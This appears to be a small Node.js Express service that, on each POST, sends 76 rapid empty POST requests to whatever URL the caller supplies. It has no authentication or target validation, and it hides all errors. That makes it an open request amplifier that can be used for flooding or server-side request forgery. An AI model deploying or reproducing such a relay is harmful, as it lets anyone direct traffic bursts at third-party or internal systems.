const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;
app.use(express.json());

app.post('/', async (req, res) => {
  const { url } = req.body;
  res.status(200).send('ok');
  
  if (url) {
    for (let i = 0; i < 76; i++) {
      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({}),
          timeout: 5000
        });
        await new Promise(resolve => setTimeout(resolve, 10));
      } catch(e) {}
    }
  }
});

app.get('/', (req, res) => {
  res.status(200).send('ok');
});

app.listen(port, () => {
  console.log(`Service running on port ${port}`);
});
